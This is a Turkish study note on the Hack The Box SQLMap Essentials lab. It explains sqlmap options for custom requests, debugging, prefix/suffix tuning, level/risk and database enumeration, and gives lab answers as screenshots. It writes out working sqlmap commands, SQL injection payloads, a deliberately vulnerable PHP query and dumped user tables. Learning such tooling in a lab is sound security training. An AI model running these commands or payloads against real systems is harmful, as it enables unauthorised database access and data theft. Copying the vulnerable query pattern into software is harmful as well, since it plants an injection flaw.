SQLMap varsayılan olarak yalnızca HTTP parametrelerini hedeflese de, SQLi güvenlik açığı için header'ları test etmek mümkündür. Bunun en kolay yolu, başlığın değerinden sonra “custom” enjeksiyon işaretini belirtmektir (örneğin --cookie=“id=1*”). Aynı prensip isteğin diğer kısımları için de geçerlidir.

Ayrıca, GET ve POST (örneğin, PUT) dışında alternatif bir HTTP yöntemi belirtmek istersek, --method seçeneğini aşağıdaki gibi kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```


## Custom HTTP Requests

SQLMap, en yaygın form veri POST body stilinin (örn. id=1) yanı sıra, JSON formatlı (örn. {“id”:1}) ve XML formatlı (örn. <element><id>1</id></element>) HTTP isteklerini de destekler.

Bu biçimler için destek “ relaxed” bir şekilde uygulanmaktadır; bu nedenle, parametre değerlerinin içeride nasıl saklanacağı konusunda katı kısıtlamalar yoktur. POST gövdesinin nispeten basit ve kısa olması durumunda --data seçeneği yeterli olacaktır.

Ancak, karmaşık veya uzun bir POST gövdesi durumunda, bir kez daha -r seçeneğini kullanabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```


Soru : Tablo bayrağı2'nin içeriği nedir? (Vaka #2)

Cevap :

![Pasted image 20241214183607.png](/img/user/resimler/Pasted%20image%2020241214183607.png)

![Pasted image 20241214183633.png](/img/user/resimler/Pasted%20image%2020241214183633.png)


![Pasted image 20241214185208.png](/img/user/resimler/Pasted%20image%2020241214185208.png)

![Pasted image 20241214185220.png](/img/user/resimler/Pasted%20image%2020241214185220.png)


[[Sqlmap dosyasının ayrıntılı acıklaması \|Sqlmap dosyasının ayrıntılı acıklaması ]]


Soru : Tablo bayrağı3'ün içeriği nedir? (Vaka #3)

Cevap : 

![Pasted image 20241214193117.png](/img/user/resimler/Pasted%20image%2020241214193117.png)

![Pasted image 20241214193146.png](/img/user/resimler/Pasted%20image%2020241214193146.png)

![Pasted image 20241214193320.png](/img/user/resimler/Pasted%20image%2020241214193320.png)

![Pasted image 20241214193348.png](/img/user/resimler/Pasted%20image%2020241214193348.png)

![Pasted image 20241214193550.png](/img/user/resimler/Pasted%20image%2020241214193550.png)

### Saldırının Detayları:

1. **Parametre:**
    
    - Hedef, HTTP isteği sırasında gönderilen **`Cookie` başlığındaki özel bir parametre**dir.
    - SQLMap çıktısında bu parametre, `Cookie #1*` olarak tanımlanmıştır. Buradaki yıldız işareti (`*`), SQLMap tarafından enjeksiyonun yapılacağı yeri belirtmek için kullanılır.
2. **Tespit Edilen SQL Enjeksiyon Türleri:** Bu parametrede SQL enjeksiyonuna açık olduğu tespit edilen farklı saldırı yöntemleri aşağıdaki gibidir:



Soru : What's the contents of table flag4? (Case #4)

Cevap : 

![Pasted image 20241214193736.png](/img/user/resimler/Pasted%20image%2020241214193736.png)

![Pasted image 20241214193840.png](/img/user/resimler/Pasted%20image%2020241214193840.png)

![Pasted image 20241214194116.png](/img/user/resimler/Pasted%20image%2020241214194116.png)

![Pasted image 20241214194140.png](/img/user/resimler/Pasted%20image%2020241214194140.png)

![Pasted image 20241214194057.png](/img/user/resimler/Pasted%20image%2020241214194057.png)



### SQLMap Hatalarını İşleme
SQLMap'i kurarken veya HTTP istekleri ile kullanırken birçok sorunla karşılaşabiliriz. Bu bölümde, sorunun nedenini bulmak ve uygun şekilde düzeltmek için önerilen mekanizmaları tartışacağız.



### Display Errors

İlk adım genellikle DBMS hatalarını (varsa) ayrıştırmak ve bunları program çalışmasının bir parçası olarak görüntülemek için --parse-errors seçeneğini değiştirmektir:

```shell-session
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...
```

Bu seçenekle, SQLMap otomatik olarak DBMS hatasını yazdırır, böylece sorunun ne olabileceği konusunda bize netlik kazandırır, böylece sorunu düzgün bir şekilde çözebiliriz.


### Store the Traffic

-t seçeneği tüm trafik içeriğini bir çıktı dosyasına kaydeder:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

M1R4CKCK@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

Yukarıdaki çıktıdan da görebileceğimiz gibi, /tmp/traffic.txt dosyası artık gönderilen ve alınan tüm HTTP isteklerini içeriyor. Böylece, sorunun nerede meydana geldiğini görmek için artık bu istekleri manuel olarak inceleyebiliriz.


## Verbose Output

Bir başka yararlı bayrak da konsol çıktısının ayrıntı düzeyini yükselten -v seçeneğidir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 16:17:40 /2020-09-24/

[16:17:40] [DEBUG] cleaning up configuration parameters
[16:17:40] [DEBUG] setting the HTTP timeout
[16:17:40] [DEBUG] setting the HTTP User-Agent header
[16:17:40] [DEBUG] creating HTTP requests opener object
[16:17:40] [DEBUG] resolving hostname 'www.example.com'
[16:17:40] [INFO] testing connection to the target URL
[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

[16:17:40] [DEBUG] declared web page charset 'utf-8'
[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:17:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <title>SQLMap Essentials - Case1</title>
</head>

<body>
...SNIP...
```

Gördüğümüz gibi, -v 6 seçeneği tüm hataları ve HTTP isteğinin tamamını doğrudan terminale yazdıracak, böylece SQLMap'in yaptığı her şeyi gerçek zamanlı olarak takip edebileceğiz.


## Using Proxy

Son olarak, tüm trafiği bir (MiTM) proxy (örneğin Burp) üzerinden yönlendirmek için --proxy seçeneğini kullanabiliriz. Bu, tüm SQLMap trafiğini Burp üzerinden yönlendirecektir, böylece daha sonra tüm istekleri manuel olarak inceleyebilir, tekrarlayabilir ve bu isteklerle Burp'un tüm özelliklerini kullanabiliriz:

![Pasted image 20241214194946.png](/img/user/resimler/Pasted%20image%2020241214194946.png)



### Attack Tuning

Çoğu durumda, SQLMap sağlanan hedef ayrıntılarıyla kutudan çıkar çıkmaz çalışmalıdır. Bununla birlikte, SQLMap'e tespit aşamasında yardımcı olmak için SQLi enjeksiyon denemelerine ince ayar yapma seçenekleri vardır. Hedefe gönderilen her payload şunlardan oluşur:

* vector (örn. UNION ALL SELECT 1,2,VERSION()): hedefte çalıştırılacak faydalı SQL kodunu taşıyan payload'un merkezi kısmı.

* bağlar `(örn. '<vector>-- -)`: vektörün savunmasız SQL ifadesine uygun şekilde eklenmesi için kullanılan prefix ve suffix formasyonları.


### Prefix/Suffix
Normal SQLMap çalıştırması tarafından kapsanmayan nadir durumlarda özel prefix ve suffix değerleri için bir gereksinim vardır.

Bu tür çalıştırmalar için --prefix ve --suffix seçenekleri aşağıdaki gibi kullanılabilir:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Bu, statik prefix %')) ile son ek -- - arasındaki tüm vektör değerlerinin çevrelenmesiyle sonuçlanacaktır.

Örneğin, hedefteki savunmasız kod şu şekildeyse:

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

UNION ALL SELECT 1,2,VERSION() vektörü, %')) ön eki ve -- - son eki ile sınırlandırıldığında, hedefte aşağıdaki (geçerli) SQL deyimiyle sonuçlanacaktır:

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```


#### **`--prefix="%'))"`**

- SQL enjeksiyon saldırılarında kullanılan **ön ek**tir. Bu, SQLMap'in enjeksiyon için kullandığı payload başına eklenecek koddur.
- Örneğin, payload şöyle oluşturulur:


![Pasted image 20241214201724.png](/img/user/resimler/Pasted%20image%2020241214201724.png)

#### **`--suffix="-- -"`**

- SQL enjeksiyon saldırılarında kullanılan **son ek**tir. Bu, SQLMap'in enjeksiyon için kullandığı payload sonuna eklenecek koddur.

Genellikle:
- **`--`**: SQL yorum operatörüdür. Sorgunun kalan kısmını yorumlayarak etkisiz hale getirir.
- **`-`**: Birçok durumda yorum işaretini güvenilir bir şekilde sonlandırmak için kullanılır.


## Level/Risk

Varsayılan olarak, SQLMap önceden tanımlanmış en yaygın sınırlar kümesini (yani, prefix/suffix çiftleri) ve savunmasız bir hedef durumunda yüksek başarı şansına sahip vektörleri birleştirir. Bununla birlikte, kullanıcıların SQLMap'e zaten dahil edilmiş olan daha büyük sınır ve vektör kümelerini kullanma olasılığı vardır.

Bu tür talepler için --level ve --risk seçenekleri kullanılmalıdır:

* --level (1-5, varsayılan 1) seçeneği, kullanılan vektörleri ve sınırları, başarı beklentilerine göre genişletir (yani, beklenti ne kadar düşükse, seviye o kadar yüksek olur).

* Risk (1-3, varsayılan 1) seçeneği, kullanılan vektör kümesini hedef tarafta sorunlara neden olma risklerine göre genişletir (yani, veritabanı girişi kaybı veya hizmet reddi riski).

Kullanılan sınırlar (boundaries) ve payloadlar arasındaki farkları kontrol etmenin en iyi yolu, **--level** ve **--risk** değerleri için, **-v** seçeneğini kullanarak ayrıntı düzeyini (verbosity level) ayarlamaktır. **-v 3** veya daha yüksek bir ayrıntı düzeyinde (örneğin, **-v 3**), kullanılan [PAYLOAD] içeren mesajlar şu şekilde görüntülenecektir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

Öte yandan, varsayılan --level değeri ile kullanılan payload'lar oldukça küçük bir sınır kümesine sahiptir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

Vektörlere gelince, kullanılan payloadları aşağıdaki gibi karşılaştırabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```


```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

Payload sayısına gelince, varsayılan olarak (yani --level=1 --risk=1), tek bir parametreyi test etmek için kullanılan payload sayısı 72'ye kadar çıkarken, en ayrıntılı durumda (--level=5 --risk=3) payload sayısı 7.865'e yükselir.

SQLMap zaten en yaygın sınırları ve vektörleri kontrol etmek için ayarlandığından, normal kullanıcıların bu seçeneklere dokunmamaları tavsiye edilir, çünkü tüm algılama sürecini önemli ölçüde yavaşlatacaktır. Bununla birlikte, OR payloadların kullanımının zorunlu olduğu SQLi güvenlik açıklarının özel durumlarında (örneğin, giriş sayfaları durumunda), risk seviyesini kendimiz yükseltmemiz gerekebilir.

Bunun nedeni, OR payloadlarının, temelde yatan savunmasız SQL deyimlerinin (daha az yaygın olmasına rağmen) veritabanı içeriğini aktif olarak değiştirdiği (örneğin DELETE veya UPDATE) varsayılan bir çalışmada doğal olarak tehlikeli olmasıdır.


```
Gelişmiş Ayarlar
Algılama mekanizmasını daha hassas bir şekilde ayarlamak için bir dizi seçenek ve parametre bulunur. Normal durumlarda, SQLMap’in bu ayarlara ihtiyaç duyulmaz. Ancak, gerektiğinde kullanabilmek için bu seçeneklere aşina olmamız önemlidir.

Durum Kodları (Status Codes)
Eğer hedef sistemin yanıtında büyük miktarda dinamik içerik varsa, TRUE ve FALSE yanıtları arasındaki küçük farklar algılama amacıyla kullanılabilir. TRUE ve FALSE yanıtları arasındaki fark HTTP durum kodlarında gözlemlenebiliyorsa (örneğin, TRUE için 200 ve FALSE için 500), --code seçeneği kullanılarak TRUE yanıtlarını belirli bir HTTP koduna sabitleyebilirsiniz (örneğin, --code=200).

Başlıklar (Titles)
Eğer yanıtlar arasındaki farklar HTTP sayfa başlıklarına bakarak görülebiliyorsa, --titles seçeneği kullanılarak algılama mekanizmasının karşılaştırmayı <title> HTML etiketinin içeriğine göre yapması sağlanabilir.

Stringler
TRUE yanıtlarında belirli bir string değeri (örneğin, "success") bulunuyorsa, ancak bu değer FALSE yanıtlarında yer almıyorsa, --string seçeneği kullanılarak algılama sadece bu değerin varlığına dayandırılabilir (örneğin, --string=success).

Sadece Metin (Text-only)
Eğer gizli içerikler (örneğin, <script>, <style>, <meta> gibi HTML sayfa davranış etiketleri) bulunuyorsa, --text-only seçeneği kullanılabilir. Bu seçenek, tüm HTML etiketlerini kaldırır ve karşılaştırmayı yalnızca metinsel (yani görünür) içerik üzerinden yapar.

Teknikler (Techniques)
Bazı özel durumlarda, kullanılan payloadları yalnızca belirli bir türle sınırlandırmak gerekebilir. Örneğin, zaman tabanlı kör payloadlar yanıt süre aşımlarına neden oluyorsa ya da yalnızca belirli bir SQLi payload türünü zorlamak istiyorsanız, --technique seçeneğiyle kullanılacak SQLi tekniğini belirleyebilirsiniz.
Örneğin, zaman tabanlı kör ve yığınlama (stacking) SQLi payloadlarını atlayarak yalnızca boolean tabanlı kör, hata tabanlı ve UNION sorgu payloadlarını test etmek istiyorsanız, şu şekilde belirtebilirsiniz: --technique=BEU.

UNION SQLi Ayarları
Bazı durumlarda, UNION SQLi payloadlarının çalışması için kullanıcı tarafından sağlanan ekstra bilgilere ihtiyaç duyulabilir. Eğer savunmasız SQL sorgusunun tam kolon sayısını manuel olarak tespit edebilirseniz, bu sayıyı --union-cols seçeneği ile SQLMap’e belirtebilirsiniz (örneğin, --union-cols=17).
Ayrıca, SQLMap tarafından varsayılan olarak kullanılan "dummy" değerler (NULL ve rastgele tamsayılar) savunmasız SQL sorgusunun sonuçlarıyla uyumlu değilse, alternatif bir değer belirtebilirsiniz (örneğin, --union-char='a').

Bunun yanı sıra, UNION sorgusunun sonunda FROM <table> gibi bir ek (appendix) kullanılması gerekiyorsa (örneğin, Oracle durumunda), bu eklentiyi --union-from seçeneği ile ayarlayabilirsiniz (örneğin, --union-from=users).
Bu eklentinin otomatik olarak doğru bir şekilde kullanılmaması, DBMS adının önceden tespit edilememesinden kaynaklanabilir.


```



Soru :  Tablo bayrağı5'in içeriği nedir? (Vaka #5)

Cevap : 

![Pasted image 20241215012134.png](/img/user/resimler/Pasted%20image%2020241215012134.png)

![Pasted image 20241215012119.png](/img/user/resimler/Pasted%20image%2020241215012119.png)


![Pasted image 20241215012104.png](/img/user/resimler/Pasted%20image%2020241215012104.png)

![Pasted image 20241215012054.png](/img/user/resimler/Pasted%20image%2020241215012054.png)


Soru :  Tablo bayrağı6'nın içeriği nedir? (Vaka #6)
cevap : 

PREFİX İLE ÇÖZÜLMESİ LAZIM AMA BYLEDE ÇÖZÜLÜYOR.

![Pasted image 20241215034408.png](/img/user/resimler/Pasted%20image%2020241215034408.png)

![Pasted image 20241215034357.png](/img/user/resimler/Pasted%20image%2020241215034357.png)


Soru : What's the contents of table flag7? (Case #7)

CEvap : 

5 kolon var direk kolon sayısını sqlmap'e verip de çalıştırabilirdik . 

![Pasted image 20241215035658.png](/img/user/resimler/Pasted%20image%2020241215035658.png)

![Pasted image 20241215035758.png](/img/user/resimler/Pasted%20image%2020241215035758.png)


### Database Enumeration

Numaralandırma, hedeflenen SQLi güvenlik açığının başarılı bir şekilde tespit edilmesinden ve kullanılabilirliğinin onaylanmasından hemen sonra yapılan bir SQL enjeksiyon saldırısının merkezi bölümünü temsil eder. Güvenlik açığı bulunan veritabanından mevcut tüm bilgilerin aranması ve alınmasından (yani dışarı sızdırılmasından) oluşur.


### **SQLMap Veri Çıkartma**  
Bu amaçla SQLMap, desteklenen tüm veritabanı yönetim sistemleri (DBMS) için önceden tanımlanmış sorgu setlerine sahiptir. Her giriş, hedefte istenilen içeriği almak için çalıştırılması gereken SQL sorgusunu temsil eder. Örneğin, bir MySQL veritabanı yönetim sistemi (DBMS) için **queries.xml** dosyasından alınan örnekler aşağıda görülebilir:


```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...

```


Örneğin, bir kullanıcı MySQL DBMS tabanlı hedef için “banner” (switch --banner) almak isterse, bu amaçla VERSION() sorgusu kullanılacaktır.
Geçerli kullanıcı adının alınması durumunda (switch --current-user), CURRENT_USER() sorgusu kullanılacaktır.

Bir başka örnek de tüm kullanıcı adlarının alınmasıdır (yani `<users>` etiketi). Duruma bağlı olarak kullanılan iki sorgu vardır. İnband olarak işaretlenen sorgu, sorgu sonuçlarının yanıtın içinde beklenebileceği tüm blind olmayan durumlarda (yani, UNION sorgusu ve hata tabanlı SQLi) kullanılır. Öte yandan, blind olarak işaretlenen sorgu, verilerin satır satır, sütun sütun ve bit bit alınması gereken tüm blind durumları için kullanılır.



### Basic DB Data Enumeration

Genellikle, bir SQLi güvenlik açığının başarılı bir şekilde tespit edilmesinden sonra, güvenlik açığı bulunan hedefin hostname'i (--hostname), mevcut kullanıcının adı (--current-user), mevcut veritabanı adı (--current-db) veya şifre hash'leri (--passwords) gibi veritabanından temel ayrıntıların numaralandırılmasına başlayabiliriz. SQLMap, daha önce tespit edilmişse SQLi tespitini atlayacak ve doğrudan DBMS numaralandırma işlemini başlatacaktır.

Numaralandırma genellikle temel bilgilerin alınmasıyla başlar:

* Database version banner (switch --banner)
* Geçerli kullanıcı adı (switch --current-user)
* Geçerli veritabanı adı (switch --current-db)
* Geçerli kullanıcının DBA (yönetici) haklarına sahip olup olmadığını kontrol etme (switch --is-dba)

Aşağıdaki SQLMap komutu yukarıdakilerin hepsini yapar:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/
```

Yukarıdaki örnekten, veritabanı sürümünün oldukça eski olduğunu (MySQL 5.1.41 - Kasım 2009'dan) ve mevcut kullanıcı adının root, mevcut veritabanı adının ise testdb olduğunu görebiliriz.

**Not:** Veritabanı bağlamındaki 'root' kullanıcısının, büyük çoğunlukla, işletim sistemi (OS) kullanıcısı olan "root" ile herhangi bir ilişkisi yoktur. Tek benzerlik, her ikisinin de kendi bağlamlarında ayrıcalıklı kullanıcıyı temsil etmesidir. Bu, temel olarak şunu ifade eder: Veritabanı kullanıcısının veritabanı bağlamında herhangi bir kısıtlaması olmamalıdır, ancak işletim sistemi ayrıcalıkları (örneğin, dosya sistemine rastgele bir konuma yazma yetkisi) en az düzeyde tutulmalıdır, özellikle son zamanlardaki dağıtımlarda. Aynı ilke genel 'DBA' rolü için de geçerlidir.


## Table Enumeration

En yaygın senaryolarda, mevcut veritabanı adını (örn. testdb) bulduktan sonra, tablo adlarının alınması --tables seçeneğini kullanarak ve DB adını -D testdb ile belirterek aşağıdaki gibi olacaktır:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

Konsol çıktısı, tablonun local bir dosyaya (users.csv) biçimlendirilmiş CSV formatında döküldüğünü gösterir.

İpucu: Varsayılan CSV dışında, `--dump-format` seçeneğiyle çıktı formatını HTML veya SQLite olarak belirleyebiliriz, böylece daha sonra DB'yi bir SQLite ortamında daha fazla inceleyebiliriz.


![Pasted image 20241215050348.png](/img/user/resimler/Pasted%20image%2020241215050348.png)


### Tablo/Satır Numaralandırma
Çok sayıda sütun ve/veya satır içeren büyük tablolarla uğraşırken, sütunları (örneğin, yalnızca ad ve soyad sütunları) -C seçeneğiyle aşağıdaki gibi belirleyebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

Satırları tablo içindeki sıra numaralarına göre daraltmak için, satırları --start ve --stop seçenekleriyle (örneğin, 2. girişten başlayarak 3. girişe kadar) aşağıdaki gibi belirtebiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```


### Koşullu Numaralandırma
